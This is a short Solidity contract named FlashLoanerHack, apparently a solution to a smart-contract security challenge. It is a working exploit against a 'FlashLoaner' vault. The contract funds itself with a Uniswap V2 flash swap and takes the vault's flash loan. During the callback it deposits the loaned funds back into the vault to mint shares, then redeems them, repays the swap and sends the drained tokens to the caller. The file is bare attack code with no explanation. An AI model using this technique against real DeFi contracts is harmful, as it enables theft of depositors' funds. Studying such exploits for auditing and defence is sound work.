pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "../flash-loaner/FlashLoaner.sol";

contract FlashLoanerHack {
    uint256 private shares;

    function run(IUniswapV2Pair _pair, FlashLoaner _flashLoan) external {
        IERC20(_pair.token0()).approve(address(_flashLoan), type(uint256).max);
        uint256 supply = _flashLoan.totalAssets() - 1;
        uint256 feeBasis = _flashLoan.feeBasis();
        uint256 fee = (supply * feeBasis) / 10000;
        uint256 swapAmount = supply + fee + 1;
        _pair.swap(
            swapAmount,
            0,
            address(this),
            abi.encode(supply, msg.sender, _flashLoan)
        );
    }

    function uniswapV2Call(
        address, /*_sender*/
        uint256 _amount0,
        uint256, /*_amount1*/
        bytes calldata _data
    ) external {
        (uint256 supply, address to, FlashLoaner flashLoan) = abi.decode(
            _data,
            (uint256, address, FlashLoaner)
        );
        IERC20 usdc = IERC20(IUniswapV2Pair(msg.sender).token0());
        flashLoan.flash(address(this), supply, abi.encode(supply));
        flashLoan.redeem(shares, address(this), address(this));
        uint256 repayAmount = calculateRepay(_amount0);
        usdc.transfer(msg.sender, repayAmount);
        usdc.transfer(to, usdc.balanceOf(address(this)));
    }

    function flashCallback(uint256 fee, bytes calldata data) external {
        uint256 supply = abi.decode(data, (uint256));
        shares = FlashLoaner(msg.sender).deposit(supply + fee, address(this));
    }

    function calculateRepay(uint256 amount) private pure returns (uint256) {
        uint256 num = amount * (10**18) * 1000;
        uint256 x = num / 997 / 10**18;
        return x + 1;
    }
}
